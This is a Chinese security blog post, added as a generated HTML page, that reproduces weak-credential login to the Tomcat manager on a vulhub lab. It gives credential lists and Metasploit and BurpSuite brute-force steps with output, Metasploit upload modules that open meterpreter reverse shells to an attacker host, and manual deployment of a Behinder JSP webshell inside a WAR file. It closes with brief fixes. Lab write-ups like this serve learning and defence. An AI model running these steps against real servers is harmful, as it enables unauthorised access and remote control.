@@ -1,0 +1,730 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" type="image/png" href="/img/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="r3change">
+  <meta name="keywords" content="">
+  <title>Tomcat管理后台弱口令+后台GetShell - 博客</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":80,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":"5c0e130ed04b8f55fb9ecacc1d607489","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>r3change's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/header.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Tomcat管理后台弱口令+后台GetShell">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-11-28 21:00" pubdate>
+        2020年11月28日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      32
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Tomcat管理后台弱口令+后台GetShell</h1>
+            
+            <div class="markdown-body">
+              <h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>使用 vulhub 靶场搭建，基于 docker 构建</p>
+<p>下载项目</p>
+<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 下载项目</span>
+wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip
+unzip vulhub-master.zip
+cd vulhub-master</code></pre>
+
+<p>进入到 Tomcat 环境所在目录</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">cd</span> tomcat/tomcat<span class="hljs-number">8</span></code></pre>
+
+<p>启动环境</p>
+<pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose up -d</span></code></pre>
+
+<p>执行上述命令后，会自动下载所需镜像，创建容器</p>
+<p>使用 <code>docker ps</code> 命令查看启动的容器</p>
+<pre><code class="hljs shell">CONTAINER ID        IMAGE               COMMAND             CREATED              STATUS              PORTS                    NAMES
+5a72857fd901        vulhub/tomcat:8.0   &quot;catalina.sh run&quot;   About a minute ago   Up About a minute   0.0.0.0:8080-&gt;8080/tcp   tomcat8_tomcat_1</code></pre>
+
+<p>容器进行了端口映射，将容器的8080端口映射到宿主机的8080端口</p>
+<p>浏览器访问 <code>http://192.168.182.129:8080</code> 即可访问 Tomcat 环境</p>
+<p><img src="/img/20201128/tomcat_1_1.png" srcset="/img/loading.gif"></p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在配置Tomcat的时候使用了常用的用户名和弱口令密码，可导致攻击者使用弱口令登录管理后台。</p>
+<p>在 <code>conf/tomcat-users.xml</code> 文件中配置用户的权限：</p>
+<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">tomcat-users</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://tomcat.apache.org/xml&quot;</span></span>
+<span class="hljs-tag">              <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span>
+<span class="hljs-tag">              <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span></span>
+<span class="hljs-tag">              <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;<span class="hljs-name">role</span> <span class="hljs-attr">rolename</span>=<span class="hljs-string">&quot;manager-gui&quot;</span>/&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">role</span> <span class="hljs-attr">rolename</span>=<span class="hljs-string">&quot;manager-script&quot;</span>/&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">role</span> <span class="hljs-attr">rolename</span>=<span class="hljs-string">&quot;manager-jmx&quot;</span>/&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">role</span> <span class="hljs-attr">rolename</span>=<span class="hljs-string">&quot;manager-status&quot;</span>/&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">role</span> <span class="hljs-attr">rolename</span>=<span class="hljs-string">&quot;admin-gui&quot;</span>/&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">role</span> <span class="hljs-attr">rolename</span>=<span class="hljs-string">&quot;admin-script&quot;</span>/&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">username</span>=<span class="hljs-string">&quot;tomcat&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;tomcat&quot;</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot;</span> /&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">tomcat-users</span>&gt;</span></code></pre>
+
+<p>上述配置用户tomcat拥有所有权限，密码是<code>tomcat</code></p>
+<p>注：正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。</p>
+<p>在管理后台提供了对Web应用程序动态部署的功能，管理员仅需要上传一个war格式的文件就能部署web应用程序，非常方便。攻击者在成功登录管理后台后，可以利用war包部署功能上传恶意脚本获取网站控制权</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="弱口令登录管理后台"><a href="#弱口令登录管理后台" class="headerlink" title="弱口令登录管理后台"></a>弱口令登录管理后台</h4><p>访问Tomcat默认管理后台地址 <code>http://192.168.182.129:8080/manager/html</code>，弹框提示要输入账号和密码</p>
+<p><img src="/img/20201128/tomcat_1_2.png" srcset="/img/loading.gif"></p>
+<p>使用弱口令 tomcat/tomcat，成功登录管理后台</p>
+<p><img src="/img/20201128/tomcat_1_3.png" srcset="/img/loading.gif"></p>
+<p>常见弱口令</p>
+<pre><code class="hljs avrasm"><span class="hljs-symbol">admin:</span>admin
+<span class="hljs-symbol">admin:</span><span class="hljs-number">123456</span>
+<span class="hljs-symbol">admin:</span>tomcat
+<span class="hljs-symbol">tomcat:</span>tomcat
+<span class="hljs-symbol">tomcat:</span>admin
+<span class="hljs-symbol">tomcat:</span><span class="hljs-number">123456</span>t</code></pre>
+
+<h4 id="口令爆破"><a href="#口令爆破" class="headerlink" title="口令爆破"></a>口令爆破</h4><h5 id="使用Metasploit来爆破"><a href="#使用Metasploit来爆破" class="headerlink" title="使用Metasploit来爆破"></a>使用Metasploit来爆破</h5><p>爆破使用 <code>auxiliary/scanner/http/tomcat_mgr_login</code> 模块</p>
+<pre><code class="hljs shell">msf5 &gt; use auxiliary/scanner/http/tomcat_mgr_login
+msf5 auxiliary(scanner/http/tomcat_mgr_login) &gt; set rhosts 192.168.182.129
+rhosts =&gt; 192.168.182.129
+<span class="hljs-meta">#</span><span class="bash"> 设置密码字典文件路径</span>
+msf5 auxiliary(scanner/http/tomcat_mgr_login) &gt; set USERPASS_FILE 
+<span class="hljs-meta">#</span><span class="bash"> 默认字典路径：/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt</span>
+<span class="hljs-meta">#</span><span class="bash"> 设置用户名字典文件路径</span>
+msf5 auxiliary(scanner/http/tomcat_mgr_login) &gt; set USER_FILE 
+<span class="hljs-meta">#</span><span class="bash"> 默认字典路径：/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt</span>
+
+<span class="hljs-meta">#</span><span class="bash"> 开始爆破</span>
+msf5 auxiliary(scanner/http/tomcat_mgr_login) &gt; run
+
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.182.129:8080 - LOGIN FAILED: admin:admin (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: admin:manager (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: admin:role1 (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: admin:root (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: admin:tomcat (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: admin:s3cret (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: admin:vagrant (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: manager:admin (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: manager:manager (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: manager:role1 (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: manager:root (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: manager:tomcat (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: manager:s3cret (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: manager:vagrant (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: role1:admin (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: role1:manager (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: role1:role1 (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: role1:root (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: role1:tomcat (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: role1:s3cret (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: role1:vagrant (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: root:admin (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: root:manager (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: root:role1 (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: root:root (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: root:tomcat (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: root:s3cret (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: root:vagrant (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: tomcat:admin (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: tomcat:manager (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: tomcat:role1 (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: tomcat:root (Incorrect)
+[+] 192.168.182.129:8080 - Login Successful: tomcat:tomcat
+[-] 192.168.182.129:8080 - LOGIN FAILED: both:admin (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: both:manager (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: both:role1 (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: both:root (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: both:tomcat (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: both:s3cret (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: both:vagrant (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: j2deployer:j2deployer (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: ovwebusr:OvW*busr1 (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: cxsdk:kdsxc (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: root:owaspbwa (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: ADMIN:ADMIN (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: xampp:xampp (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: QCC:QLogic66 (Incorrect)
+[-] 192.168.182.129:8080 - LOGIN FAILED: admin:vagrant (Incorrect)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed</code></pre>
+
+<p>从输出结果中可以看到爆破出弱口令：tomcat:tomcat</p>
+<h5 id="使用BurpSuite来爆破"><a href="#使用BurpSuite来爆破" class="headerlink" title="使用BurpSuite来爆破"></a>使用BurpSuite来爆破</h5><p>抓取登录认证请求数据包，发送到Intruder</p>
+<p><img src="/img/20201128/tomcat_1_4.png" srcset="/img/loading.gif"></p>
+<p>设置 Payload type为 custom iterator（自定义迭代器）</p>
+<p>设置Payload</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">Position</span> <span class="hljs-number">1</span> 添加用户字典
+<span class="hljs-attribute">Position</span> <span class="hljs-number">2</span> 添加 : 字符
+<span class="hljs-attribute">Position</span> <span class="hljs-number">3</span> 添加密码字典</code></pre>
+
+<p>注：Tomcat管理后台使用BASIC认证，在HTTP请求头中有一个Authorization字段，其值为 <code>username:password</code> 的Base64编码</p>
+<p><img src="/img/20201128/tomcat_1_5.png" srcset="/img/loading.gif"></p>
+<p>Payload Processing选择 Encode base64</p>
+<p>Payload Encoding去掉勾选 URL-encode</p>
+<p><img src="/img/20201128/tomcat_1_6.png" srcset="/img/loading.gif"></p>
+<p>开始爆破，爆破完成后，查看有无状态码为200的请求，有表示爆破成功</p>
+<p><img src="/img/20201128/tomcat_1_7.png" srcset="/img/loading.gif"></p>
+<p>注：请求响应状态码401（未经授权：访问由于凭据无效被拒绝），响应状态码200表示登录成功</p>
+<h4 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h4><h5 id="使用Metasploit来GetShell"><a href="#使用Metasploit来GetShell" class="headerlink" title="使用Metasploit来GetShell"></a>使用Metasploit来GetShell</h5><p>使用 <code>exploit/multi/http/tomcat_mgr_upload</code> 模块进行攻击</p>
+<pre><code class="hljs shell">msf5 &gt; use exploit/multi/http/tomcat_mgr_upload
+msf5 exploit(multi/http/tomcat_mgr_upload) &gt; set payload java/meterpreter/reverse_tcp 
+payload =&gt; java/meterpreter/reverse_tcp
+msf5 exploit(multi/http/tomcat_mgr_upload) &gt; set httppassword tomcat
+httppassword =&gt; tomcat
+msf5 exploit(multi/http/tomcat_mgr_upload) &gt; set httpusername tomcat
+httpusername =&gt; tomcat
+msf5 exploit(multi/http/tomcat_mgr_upload) &gt; set rhosts 192.168.182.129
+rhosts =&gt; 192.168.182.129
+msf5 exploit(multi/http/tomcat_mgr_upload) &gt; set rport 8080
+rport =&gt; 8080
+msf5 exploit(multi/http/tomcat_mgr_upload) &gt; set lhost 192.168.182.130
+lhost =&gt; 192.168.182.130
+
+<span class="hljs-meta">#</span><span class="bash"> 执行攻击</span>
+msf5 exploit(multi/http/tomcat_mgr_upload) &gt; run
+
+[*] Started reverse TCP handler on 192.168.182.130:4444 
+[*] Retrieving session ID and CSRF token...
+[*] Uploading and deploying we0BbuituTWZkwjmc...
+[*] Executing we0BbuituTWZkwjmc...
+[*] Undeploying we0BbuituTWZkwjmc ...
+[*] Sending stage (53906 bytes) to 192.168.182.129
+[*] Meterpreter session 1 opened (192.168.182.130:4444 -&gt; 192.168.182.129:60416) at 2020-11-28 12:05:01 -0500
+
+meterpreter &gt;</code></pre>
+
+<p>攻击成功返回一个 meterpreter 会话</p>
+<p>使用 <code>exploit/multi/http/tomcat_mgr_deploy</code> 模块进行攻击</p>
+<pre><code class="hljs shell">msf5 &gt; use exploit/multi/http/tomcat_mgr_deploy
+msf5 exploit(multi/http/tomcat_mgr_deploy) &gt; set payload java/meterpreter/reverse_tcp 
+payload =&gt; java/meterpreter/reverse_tcp
+msf5 exploit(multi/http/tomcat_mgr_deploy) &gt; set rhosts 192.168.182.129
+rhosts =&gt; 192.168.182.129
+msf5 exploit(multi/http/tomcat_mgr_deploy) &gt; set httppassword tomcat
+httppassword =&gt; tomcat
+msf5 exploit(multi/http/tomcat_mgr_deploy) &gt; set httpusername tomcat
+httpusername =&gt; tomcat
+msf5 exploit(multi/http/tomcat_mgr_deploy) &gt; set rport 8080
+rport =&gt; 8080
+msf5 exploit(multi/http/tomcat_mgr_deploy) &gt; set lhost 192.168.182.130
+lhost =&gt; 192.168.182.130
+<span class="hljs-meta">#</span><span class="bash"> 攻击Tomcat7以后的版本，必须设置path选项，因为对于tomcat7以后的版本，Manager应用程序经过重新构造，一些url已经更改</span>
+msf5 exploit(multi/http/tomcat_mgr_deploy) &gt; set path /manager/text
+path =&gt; /manager/text
+<span class="hljs-meta">#</span><span class="bash"> 必须设置 target 选项，因为不能自动选择目标攻击会失败</span>
+msf5 exploit(multi/http/tomcat_mgr_deploy) &gt; set target 1
+target =&gt; 1
+msf5 exploit(multi/http/tomcat_mgr_deploy) &gt; run
+
+[*] Started reverse TCP handler on 192.168.182.130:5555 
+[*] Using manually select target &quot;Java Universal&quot;
+[*] Uploading 6274 bytes as KYpDVz8KNGLcCjuAeVTdY.war ...
+[*] Executing /KYpDVz8KNGLcCjuAeVTdY/IEGOkwl5uX0kAPC3hVW.jsp...
+[*] Undeploying KYpDVz8KNGLcCjuAeVTdY ...
+[*] Sending stage (53906 bytes) to 192.168.182.129
+[*] Meterpreter session 2 opened (192.168.182.130:5555 -&gt; 192.168.182.129:54414) at 2020-11-28 12:13:13 -0500
+
+meterpreter &gt;</code></pre>
+
+<p>攻击成功同样会返回一个 meterpreter 会话</p>
+<h5 id="管理后台手动部署WAR包GetShell"><a href="#管理后台手动部署WAR包GetShell" class="headerlink" title="管理后台手动部署WAR包GetShell"></a>管理后台手动部署WAR包GetShell</h5><p>首先登录管理后台，滑动页面到 war file to deploy 处</p>
+<p><img src="/img/20201128/tomcat_1_8.png" srcset="/img/loading.gif"></p>
+<p>上传包含木马的WAR包GetShell</p>
+<p>WAR包，文件后缀名为 <code>.war</code>，其本质上是一个压缩包格式的文件。将冰蝎的jsp马打包成压缩包文件，然后将后缀名改为 <code>.war</code> </p>
+<p><img src="/img/20201128/tomcat_1_9.png" srcset="/img/loading.gif"></p>
+<p>上传该文件，点击Deploy按钮进行上传部署，成功后可以在 <code>applications</code> 栏中看到部署的应用</p>
+<p><img src="/img/20201128/tomcat_1_10.png" srcset="/img/loading.gif"></p>
+<p>对应访问地址是：<code>http://192.168.182.129:8080/shell/shell.jsp</code></p>
+<p>使用冰蝎连接</p>
+<p><img src="/img/20201128/tomcat_1_11.png" srcset="/img/loading.gif"></p>
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ol>
+<li><p>如果不需要重新部署或部署新的Web应用，可以将管理后台删除</p>
+</li>
+<li><p>为管理后台设置复杂的用户密码</p>
+</li>
+</ol>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Tomcat/">Tomcat</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/12/05/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">在线工具收集</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/11/26/User-Agent%E5%A4%B4%E6%94%B6%E9%9B%86/">
+                        <span class="hidden-mobile">User-Agent头收集</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?5c0e130ed04b8f55fb9ecacc1d607489";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
